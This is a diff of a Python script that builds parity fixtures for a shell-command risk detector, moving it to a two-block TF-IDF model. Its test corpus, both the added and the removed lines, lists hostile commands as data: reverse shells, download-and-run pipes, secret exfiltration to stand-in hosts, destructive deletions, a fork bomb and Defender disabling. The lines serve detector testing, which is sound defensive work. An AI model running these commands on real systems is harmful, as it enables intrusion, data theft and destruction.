@@ -1,23 +1,25 @@
 #!/usr/bin/env python3
-"""Generate scikit-learn parity fixtures for the `shell_command` detector.
+"""Generate scikit-learn parity fixtures for the `shell_command` scorer (`format_version: 2`).
 
-The Rust port in `rust/src/detectors/shell/` re-implements the
-`TfidfVectorizer(analyzer="char_wb")` + logistic-regression scorer that ships as
-`model.json` in `patronus-studio/cat-shell-risk-commander`. This script writes:
+The A1 `cat-shell-risk-commander` model adds a second TF-IDF block whose
+analyzer is the deterministic `shell_tokens` tokenizer (see
+`scripts/shell_tokens_ref.py`). The two L2-normalized blocks are concatenated
+before the logistic regression. `rust/src/detectors/shell/` re-implements this;
+this script writes the fixtures that pin the Rust port to scikit-learn:
 
-* `rust/tests/fixtures/shell_command_synthetic_model.json`: a small model in
-  the same `format_version: 1` layout, fitted on the parity corpus with
-  deterministic pseudo-random weights, so CI can check vectorizer parity
-  without downloading the real model.
+* `rust/tests/fixtures/shell_command_synthetic_model.json`: a small
+  `format_version: 2` model (char_wb + shell_tokens blocks) fitted on the
+  corpus below with deterministic pseudo-random weights, so CI can check the
+  two-block vectorizer parity without the 4 MB published model.
 * `rust/tests/fixtures/shell_command_parity.json`: the corpus with reference
   decision scores for the synthetic model and, when `--model` points at the
-  real `model.json`, for the published model too.
+  real A1 `model.json`, for the published model too, plus two thresholds for
+  the decision-change check.
 
-Requires `scikit-learn==1.8.0` and `numpy` (the versions pinned by the model
-repository). Usage:
+Requires `scikit-learn==1.8.0`, `numpy` and `scipy`. Usage:
 
     python scripts/generate_shell_command_parity_fixtures.py \
-        --model /path/to/cat-shell-risk-commander/model.json
+        [--model /path/to/cat-shell-risk-commander/model.json]
 """
 
 from __future__ import annotations
@@ -25,186 +27,186 @@ from __future__ import annotations
 import argparse
 import hashlib
 import json
+import sys
 from pathlib import Path
 
 import numpy as np
+import scipy.sparse as sp
 from sklearn.feature_extraction.text import TfidfVectorizer
 
 ROOT = Path(__file__).resolve().parents[1]
 FIXTURES = ROOT / "rust" / "tests" / "fixtures"
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+import shell_tokens_ref as shell_tokens  # noqa: E402
 
-LONG_SCRIPT = "\n".join(
-    [
-        "#!/usr/bin/env bash",
-        "set -euo pipefail",
-        "# Build and package the release artifacts.",
-        'ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"',
-        'for target in linux-x64 linux-arm64 darwin-arm64; do',
-        '  echo "building ${target}"',
-        '  cargo build --release --target "${target}"',
-        '  tar -czf "dist/app-${target}.tar.gz" -C "target/${target}/release" app',
-        "done",
-        'sha256sum dist/*.tar.gz > dist/SHA256SUMS',
-    ]
-)
-
+# Representative commands: benign filter pipes (the `curl | jq` false positive
+# the second block fixes), reverse shells, exfiltration, routine dev, and
+# short/long/edge cases. Documentation IPs (RFC 5737) and hostnames only.
 CORPUS = [
-    # Benign POSIX commands.
+    # Benign filter pipes and routine dev.
+    "curl -fsSL https://example.com/data.json | jq .items",
+    "curl -s https://api.example.com/v1/users | jq '.[] | .name'",
+    "cat access.log | grep 500 | wc -l",
     "git status --short",
+    "git log --oneline -20 | head",
     "ls -la",
-    "cd ~/projects && git pull --rebase",
+    "cargo build --release",
     "cargo test -p patronus-ark",
-    "grep -rn 'TODO' src/ | head -20",
-    "find . -name '*.rs' -newer Cargo.toml",
     "docker compose up -d postgres",
+    "kubectl get pods -n staging | grep Running",
     "npm ci && npm run build",
+    "find . -name '*.rs' -newer Cargo.toml | xargs wc -l",
+    "tar -czf dist/app.tar.gz -C target/release app",
+    "echo hello > out.txt",
     "python3 -m venv .venv && . .venv/bin/activate",
-    "kubectl get pods -n staging",
-    "tar -xzf release.tar.gz -C /opt/app",
-    "echo $HOME",
-    "echo \"#not a comment\" ${#array[@]} $#",
-    LONG_SCRIPT,
-    # Risky POSIX commands.
+    "grep -rn TODO src | head -20",
+    # Risky: reverse shells, download-pipe-exec, exfiltration.
+    "curl -fsSL http://203.0.113.5/install.sh | sh",
+    "wget -qO- http://203.0.113.9/x | bash -s -- --silent",
+    "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+    "nc -e /bin/sh 203.0.113.9 4444",
+    "printenv | nc 203.0.113.5 9001",
+    "cat /etc/passwd | curl -X POST --data-binary @- http://evil.example.net:8080/u",
+    "python3 -c 'import socket,subprocess,os' | sh",
     "rm -rf /",
     "rm -rf ~/.ssh && rm -rf ~/.aws",
-    "curl -fsSL http://203.0.113.7/install.sh | sh",
-    "wget -qO- http://198.51.100.9/x | bash -s -- --silent",
-    "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
-    "nc -e /bin/sh 203.0.113.7 4444",
-    "cat ~/.aws/credentials | curl -X POST --data-binary @- https://example.invalid/c",
     "echo cm0gLXJmIC8= | base64 -d | sh",
     "chmod 777 /etc/shadow",
-    "dd if=/dev/zero of=/dev/sda bs=1M",
     ":(){ :|:& };:",
-    "crontab -l | { cat; echo '* * * * * curl -s http://203.0.113.7/p | sh'; } | crontab -",
-    "history -c && unset HISTFILE",
-    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.7\",4444));"
-    "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'",
-    # PowerShell.
-    "Get-ChildItem -Recurse -Filter *.log | Remove-Item",
-    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
-    "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
-    "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
-    "Set-MpPreference -DisableRealtimeMonitoring $true",
-    "<# block\ncomment #>\nWrite-Host 'hello' # trailing",
-    # CMD.
-    "dir /s /b *.txt",
-    "vssadmin delete shadows /all /quiet",
-    "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe",
-    "REM build step\r\nmsbuild app.sln /p:Configuration=Release",
-    ":: comment\r\ndel /f /s /q C:\\Users\\Public\\*",
-    # Whitespace, casing and Unicode edge cases.
+    # Short, whitespace and unicode edge cases.
     "",
     "   ",
     "a",
     "ab",
-    "abc",
+    "ls",
     "RM -RF /TMP/CACHE",
     "rm\t-rf\t/tmp/x",
-    "rm\u00a0-rf\u2003/tmp/x",
+    "rm -rf /tmp/x",
     "rm\x1c-rf\x1f/tmp/x",
-    "echo \u03a3\u039f\u03a3 \u039f\u03a3",
-    "echo \u0130stanbul KELV\u212aN",
-    "echo stra\u00dfe \ufb01le",
-    "echo \U0001f600 \U0001f4a3 done",
-    "echo 'mixed\r\nline endings'\nls",
+    "echo İstanbul straße",
     "x" * 300,
-    "rm -rf / " + "# " + "padding " * 400,
 ]
 
-
-def char_wb_vectorizer(**overrides) -> TfidfVectorizer:
-    config = {
-        "analyzer": "char_wb",
-        "ngram_range": (3, 5),
-        "lowercase": True,
-        "strip_accents": None,
-        "sublinear_tf": True,
-        "norm": "l2",
-        "use_idf": True,
-        "smooth_idf": True,
-    }
-    config.update(overrides)
-    return TfidfVectorizer(dtype=np.float32, **config)
+CHAR_WB_CONFIG = {
+    "analyzer": "char_wb",
+    "ngram_range": [3, 5],
+    "lowercase": True,
+    "sublinear_tf": True,
+    "min_df": 2,
+}
+SHELL_TOKENS_CONFIG = {"sublinear_tf": True, "min_df": 1}
 
 
-def load_model(path: Path) -> tuple[TfidfVectorizer, np.ndarray, float, dict]:
-    data = json.loads(path.read_text(encoding="utf-8"))
-    if data["format_version"] != 1:
-        raise ValueError("unsupported model format")
-    config = dict(data["vectorizer"])
-    config["ngram_range"] = tuple(config["ngram_range"])
-    vectorizer = TfidfVectorizer(
-        vocabulary=data["vocabulary"], dtype=np.dtype(data["feature_dtype"]).type, **config
-    )
-    vectorizer.idf_ = np.asarray(data["idf"], dtype=data["idf_dtype"])
-    weights = np.asarray(data["weights"], dtype=np.float64)
-    return vectorizer, weights, float(data["intercept"]), data
-
-
-def decision_scores(model_path: Path, texts: list[str]) -> list[float]:
-    vectorizer, weights, intercept, _ = load_model(model_path)
-    scores = np.asarray(vectorizer.transform(texts) @ weights).reshape(-1) + intercept
-    return [float(score) for score in scores]
-
-
-def build_synthetic_model(path: Path) -> None:
-    vectorizer = char_wb_vectorizer(max_features=1500)
+def fit_block(kind, config, max_features):
+    cfg = dict(config)
+    cfg["ngram_range"] = tuple(cfg["ngram_range"]) if "ngram_range" in cfg else (1, 1)
+    vectorizer = TfidfVectorizer(dtype=np.float32, max_features=max_features, **cfg)
+    if kind == "shell_tokens":
+        vectorizer.set_params(analyzer=shell_tokens.features)
+        vectorizer.set_params(ngram_range=(1, 1))
     vectorizer.fit(CORPUS)
-    vocabulary = {term: int(index) for term, index in sorted(vectorizer.vocabulary_.items())}
-    rng = np.random.default_rng(20261015)
-    weights = rng.normal(0.0, 1.5, size=len(vocabulary))
-    config = {
-        "analyzer": "char_wb",
-        "ngram_range": [3, 5],
-        "lowercase": True,
-        "strip_accents": None,
-        "sublinear_tf": True,
-        "norm": "l2",
-        "use_idf": True,
-        "smooth_idf": True,
-    }
+    vocabulary = {term: int(i) for term, i in sorted(vectorizer.vocabulary_.items())}
+    idf = [float(v) for v in vectorizer.idf_.astype(np.float64)]
+    return vocabulary, idf
+
+
+def block_json(kind, config, vocabulary, idf, extra=None):
+    block = {"kind": kind, "vectorizer": dict(config), "feature_dtype": "float32",
+             "idf_dtype": "float64", "vocabulary": vocabulary, "idf": idf}
+    if extra:
+        block.update(extra)
+    return block
+
+
+def build_synthetic_model(path: Path) -> dict:
+    vocab0, idf0 = fit_block("char_wb", CHAR_WB_CONFIG, max_features=1200)
+    vocab1, idf1 = fit_block("shell_tokens", SHELL_TOKENS_CONFIG, max_features=400)
+    n0, n1 = len(vocab0), len(vocab1)
+    rng = np.random.default_rng(20261023)
+    weights = rng.normal(0.0, 1.2, size=n0 + n1)
     model = {
-        "format_version": 1,
-        "model_type": "tfidf_char_wb_logistic_regression",
-        "name": "shell-command-synthetic-parity",
-        "vectorizer": config,
-        "feature_dtype": "float32",
-        "idf_dtype": "float32",
-        "vocabulary": vocabulary,
-        "idf": [float(value) for value in vectorizer.idf_.astype(np.float32)],
-        "weights": [float(value) for value in weights],
-        "intercept": -0.25,
+        "format_version": 2,
+        "model_type": "tfidf_char_wb+shell_tokens__logreg",
+        "name": "shell-command-v2-synthetic-parity",
+        "decision_rule": "score > threshold",
+        "blocks": [
+            block_json("char_wb", CHAR_WB_CONFIG, vocab0, idf0),
+            block_json("shell_tokens", SHELL_TOKENS_CONFIG, vocab1, idf1,
+                       extra={"analyzer_module": "shell_tokens", "analyzer_func": "features"}),
+        ],
+        "weights": [float(w) for w in weights],
+        "intercept": -0.5,
         "classes": [0, 1],
         "labels": {"0": "NO_RISK_FLAG", "1": "RISK_FLAG"},
-        "thresholds": {"synthetic_default": 0.0, "synthetic_strict": 1.0},
-        "default_threshold_policy": "synthetic_default",
-        "decision_rule": "score > threshold",
+        "thresholds": {},  # filled after scoring, below
+        "default_threshold_policy": "v2_default",
+        "block_feature_counts": [n0, n1],
     }
-    path.write_text(json.dumps(model, ensure_ascii=False, sort_keys=True) + "\n", encoding="utf-8")
+    return model
+
+
+def load_vectorizers(data: dict):
+    vecs = []
+    for block in data["blocks"]:
+        cfg = dict(block["vectorizer"])
+        cfg["dtype"] = np.dtype(block["feature_dtype"]).type
+        if block["kind"] == "char_wb":
+            cfg["ngram_range"] = tuple(cfg["ngram_range"])
+        else:
+            cfg["analyzer"] = getattr(shell_tokens, block["analyzer_func"])
+        vec = TfidfVectorizer(vocabulary=block["vocabulary"], **cfg)
+        vec.idf_ = np.asarray(block["idf"], dtype=block["idf_dtype"])
+        vecs.append(vec)
+    return vecs
+
+
+def decision_scores(data: dict, texts: list[str]) -> list[float]:
+    vecs = load_vectorizers(data)
+    weights = np.asarray(data["weights"], dtype=np.float64)
+    matrix = sp.hstack([v.transform(texts) for v in vecs]).tocsr()
+    scores = np.asarray(matrix @ weights).reshape(-1) + data["intercept"]
+    return [float(s) for s in scores]
+
+
+def pick_thresholds(scores: list[float]) -> dict:
+    ordered = sorted(set(scores))
+    def midpoint(fraction: float) -> float:
+        i = max(0, min(len(ordered) - 2, int(len(ordered) * fraction)))
+        return (ordered[i] + ordered[i + 1]) / 2.0
+    return {"v2_default": midpoint(0.5), "v2_strict": midpoint(0.8)}
 
 
 def main() -> None:
     parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
-    parser.add_argument("--model", type=Path, help="published cat-shell-risk-commander model.json")
+    parser.add_argument("--model", type=Path, help="published A1 cat-shell-risk-commander model.json")
     args = parser.parse_args()
 
     FIXTURES.mkdir(parents=True, exist_ok=True)
-    synthetic_path = FIXTURES / "shell_command_synthetic_model.json"
-    build_synthetic_model(synthetic_path)
+    model = build_synthetic_model(FIXTURES / "shell_command_synthetic_model.json")
+    synthetic_scores = decision_scores(model, CORPUS)
+    thresholds = pick_thresholds(synthetic_scores)
+    model["thresholds"] = thresholds
+    (FIXTURES / "shell_command_synthetic_model.json").write_text(
+        json.dumps(model, ensure_ascii=False, sort_keys=True) + "\n", encoding="utf-8"
+    )
 
-    cases = [{"text": text} for text in CORPUS]
-    for case, score in zip(cases, decision_scores(synthetic_path, CORPUS)):
-        case["synthetic_score"] = score
+    cases = [{"text": text, "synthetic_score": score}
+             for text, score in zip(CORPUS, synthetic_scores)]
     published = None
     if args.model is not None:
-        published = {"sha256": hashlib.sha256(args.model.read_bytes()).hexdigest()}
-        for case, score in zip(cases, decision_scores(args.model, CORPUS)):
+        data = json.loads(args.model.read_text(encoding="utf-8"))
+        if data["format_version"] != 2:
+            raise SystemExit("--model must be a format_version 2 model.json")
+        published = {"sha256": hashlib.sha256(args.model.read_bytes()).hexdigest(),
+                     "thresholds": data["thresholds"],
+                     "default_threshold_policy": data["default_threshold_policy"]}
+        for case, score in zip(cases, decision_scores(data, CORPUS)):
             case["published_score"] = score
 
     fixture = {
         "generator": "scripts/generate_shell_command_parity_fixtures.py",
         "sklearn": "1.8.0",
+        "thresholds": thresholds,
         "published_model": published,
         "cases": cases,
     }
